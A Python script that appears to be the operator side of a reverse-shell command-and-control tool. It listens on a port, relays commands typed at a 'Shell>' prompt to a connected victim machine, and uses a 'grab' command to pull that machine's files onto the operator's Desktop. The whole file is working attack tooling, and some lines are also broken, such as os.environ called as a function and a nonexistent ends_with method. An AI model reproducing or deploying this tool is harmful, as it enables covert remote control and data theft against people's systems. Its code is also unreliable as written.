#!/usr/bin/env python
#Works only with Python 3

#Server

import socket, time, sys, os

ip_address = "192.168.0.200"
port = 8080
CHUNK = 1024
PATH = os.environ('HOME') + '/Desktop'

def transfer(conn, command):
    conn.send(command)
    file_name = PATH + '/place_holder.jpg'
    f = open(file_name, 'wb')

    while(True):
        data = conn.recv(CHUNK)
        if data.ends_with('DONE'.encode()):
            f.write(data[:-4])
            f.close()
            print("[+] File transfer completed")
            break
        if "File not found" in data:
            print("[-] File was not found")
            break
        f.write(data)

def print_usage():
  print("""
  Available c2c commands:
   - exit (terminate the connection)
   - restart (restart current connection)
   - grab (transfer file)
   - cd (navigate to dir) """)

def create_socket():
  global ip_address, port

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((ip_address, port));
  s.listen(1)
  print("\nNew socket was created")
  print_usage()
  return s

def connect():
    try:
      s = create_socket()
      conn, addr = s.accept()
      print('[+] connection from ', addr)
      while(1):
          command = check_input()
          if 'exit' in command:
              conn.send(command.encode())
              conn.close()
              break
          elif 'restart' in command:
              conn.send(command.encode())
              conn.close()
              return "restart"
          elif 'grab' in command:
              transfer(conn, command.encode())
          else:
              conn.send(command.encode())
              print(conn.recv(CHUNK).decode())
    except KeyboardInterrupt:
      print("Ctrl + C pressed, shuting down ..")
      conn.send('restart'.encode())
      conn.close()

def timer(seconds):
  print("Plase standby restarting the process: takes {} sec".format(seconds))
  for i in range(1, seconds):
    time.sleep(1)
    number = seconds - i
    sys.stdout.flush()
    sys.stdout.write(" " + str(number) + " ")
    sys.stdout.flush()

def check_input():
  cmd = input("Shell>")
  if len(cmd) > 0:
    return cmd
  else:
    return "ls -lA"

def main():
  if connect() == "restart":
    timer(80)
    sys.stdout.flush()
    main()

if __name__ == '__main__':
    main()
